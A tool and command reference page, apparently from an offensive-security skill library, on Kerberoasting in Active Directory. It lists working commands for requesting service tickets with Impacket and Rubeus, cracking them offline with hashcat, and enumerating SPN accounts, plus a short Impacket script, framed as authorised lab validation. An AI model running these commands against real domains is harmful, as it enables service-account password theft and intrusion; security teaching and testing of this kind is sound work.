# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`active-directory-kerberos-attacks-kerberoasting`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `impacket-GetUserSPNs` | `impacket-GetUserSPNs corp.example/lowpriv:pass -dc-ip 10.20.30.10 -request -outputfile tgs.txt` | Request service tickets for SPN accounts | Linux / Windows |
| `Rubeus` | `Rubeus.exe kerberoast /user:svc_sql /enctype:rc4 /outfile:tgs.txt /nowrap` | Targeted request from a Windows host | Windows |
| `hashcat` | `hashcat -m 13100 tgs.txt wordlist.txt -r rules/best64.rule` | Offline recovery of an RC4 service ticket, authorised lab only | Linux / Windows |
| `Get-ADUser` | `Get-ADUser -Filter {ServicePrincipalName -like '*'} -Properties msDS-SupportedEncryptionTypes` | Exploitable-set enumeration | Windows |
| `klist` | `klist -e` | Cached ticket encryption types on the client | Windows |

## Minimal Lab Validation Script

Request one ticket and print the returned encryption type beside the account's attribute, so the differential is explicit.

```python
from impacket.krb5.kerberosv5 import getKerberosTGS
from impacket.krb5.types import Principal
from impacket.krb5 import constants

# Request one TGS for one SPN and report its encryption type.
# Requires a valid ccache in KRB5CCNAME for an authorised lab identity.
def request(spn, domain, kdc):
    server = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
    tgs, cipher, _old, _sk, _spn = getKerberosTGS(server, domain, kdc, None)
    print(spn, "etype", cipher)

request("MSSQLSvc/sql01.corp.example:1433", "CORP.EXAMPLE", "10.20.30.10")
```

## Flag Notes

- `-request` is required to fetch tickets; without it the tool only lists SPN accounts.
- `/enctype:rc4` forces the comparison case; `/enctype:aes256` shows the hardened behaviour.
- `-m 13100` is the hashcat mode for RC4 service tickets, distinct from 18200 for AS-REP.
